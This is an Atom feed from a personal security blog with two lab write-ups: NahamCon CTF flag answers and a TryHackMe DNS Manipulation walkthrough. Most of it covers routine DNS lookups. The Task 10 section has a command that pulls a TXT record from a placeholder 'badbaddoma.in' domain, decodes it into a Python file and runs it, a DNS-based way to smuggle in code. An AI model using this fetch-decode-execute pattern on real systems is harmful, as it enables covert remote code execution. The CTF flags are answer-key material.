@@ -1,0 +1,99 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+ <title>0xbeven - Blog Site</title>
+ <link href="https://beven.co.zw/atom.xml" rel="self"/>
+ <link href="https://beven.co.zw/"/>
+ <updated>2021-03-14T01:56:31+02:00</updated>
+ <id>https://beven.co.zw</id>
+ <author>
+   <name>Beven Nyamande</name>
+   <email>wasp00007@gmail.com</email>
+ </author>
+
+ 
+ <entry>
+   <title>Nahamcon CTF Challenges</title>
+   <link href="https://beven.co.zw/2021/03/13/nahamconctf-2021"/>
+   <updated>2021-03-13T00:00:00+02:00</updated>
+   <id>https://beven.co.zw/2021/03/13/NahamconCTF-2021</id>
+   <content type="html">&lt;h1 id=&quot;meet-the-team&quot;&gt;Meet The Team&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;twitter flag flag{e483bffafbb0db5eabc121846b455bc7}&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/gusrodry/development&quot;&gt;github repo&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;bionic&quot;&gt;Bionic&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://constellations.page&quot;&gt;website&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;flag from https://constellations.page/robots.txt&lt;/li&gt;
+  &lt;li&gt;flag{33b5240485dda77430d3de22996297a1}&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>DNS Manipulation - TryHackMe Room</title>
+   <link href="https://beven.co.zw/2021/03/11/dns-infil-exfil-thm-room"/>
+   <updated>2021-03-11T00:00:00+02:00</updated>
+   <id>https://beven.co.zw/2021/03/11/DNS-Infil-Exfil-THM-Room</id>
+   <content type="html">&lt;p&gt;Room: &lt;a href=&quot;https://tryhackme.com/room/dnsmanipulation&quot;&gt;DNS Manipulation&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;task-4-what-is-dns&quot;&gt;Task 4: What is DNS?&lt;/h1&gt;
+&lt;h3 id=&quot;if-you-were-on-windows-what-command-could-you-use-to-query-a-txt-record-for-youtubecom&quot;&gt;If you were on Windows, what command could you use to query a txt record for ‘youtube.com’?&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nslookup &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;TXT domaintosearch.com 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;if-you-were-on-linux-what-command-could-you-use-to-query-a-txt-record-for-facebookcom&quot;&gt;If you were on Linux, what command could you use to query a txt record for ‘facebook.com’?&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dig domaintosearch.com txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;aaaa-stores-what-type-of-ip-address-along-with-the-hostname&quot;&gt;AAAA stores what type of IP Address along with the hostname?&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;IPv6
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;maximum-characters-for-a-dns-txt-record-is-256-yaynay&quot;&gt;Maximum characters for a DNS TXT Record is 256. (Yay/Nay)&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nay
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;what-dns-record-provides-a-domain-name-in-reverse-lookup-research&quot;&gt;What DNS Record provides a domain name in reverse-lookup? (Research)&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PTR
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;what-would-the-reverse-lookup-be-for-the-following-ipv4-address-1921682032-research&quot;&gt;What would the reverse-lookup be for the following IPv4 Address? (192.168.203.2) (Research)&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;in your Linux terminal enter the following command replacing the IP of interest&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;host IP_ADDRESS
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;task-5-what-is-dns-exfiltration&quot;&gt;Task 5 What is DNS Exfiltration?&lt;/h1&gt;
+&lt;h3 id=&quot;what-is-the-maximum-length-of-a-dns-name&quot;&gt;What is the maximum length of a DNS name?&lt;/h3&gt;
+&lt;p&gt;Check this &lt;a href=&quot;https://en.wikipedia.org/wiki/Domain_Name_System&quot;&gt;article&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;task-7--exfiltration-practice&quot;&gt;Task 7 : Exfiltration Practice&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;login with SSH provided&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;task-10--infiltration-practice&quot;&gt;Task 10 : Infiltration Practice&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;Read the TASK file carefully, you will thank me later, spent time on this …&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; nslookup &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;txt REDACTED.badbaddoma.in |grep &lt;span class=&quot;s2&quot;&gt;&quot;Ye&quot;&lt;/span&gt; |cut &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f2&lt;/span&gt; |base58 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; |base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; decoded.py
+
+ python3 decoded.py
+ 
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</content>
+ </entry>
+ 
+
+</feed>
